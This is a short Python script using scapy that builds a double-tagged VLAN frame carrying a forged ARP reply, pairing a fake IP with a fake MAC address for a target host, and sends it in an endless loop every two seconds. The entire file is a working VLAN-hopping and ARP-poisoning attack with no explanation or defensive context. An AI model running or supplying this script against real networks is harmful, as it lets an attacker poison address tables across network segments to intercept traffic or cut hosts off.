# -*- coding:utf-8 -*-

import time
from scapy.all import sendp,ARP,Ether,Dot1Q

iface = 'eth0'
tatget_ip = '192.168.1.100'
fake_ip = '192.168.1.200'
fake_mac = '11:22:33:aa:bb:cc'
self_vlan = 1
target_vlan = 2

packet = Ether()/ \
        Dot1Q(vlan=self_vlan) / \
        Dot1Q(vlan=target_vlan) / \
        ARP(hwsrc=fake_mac,
           pdst=tatget_ip,
           psrc=fake_ip,
           op='is-at')

while True:
    sendp(packet,iface=iface)
    time.sleep(2)
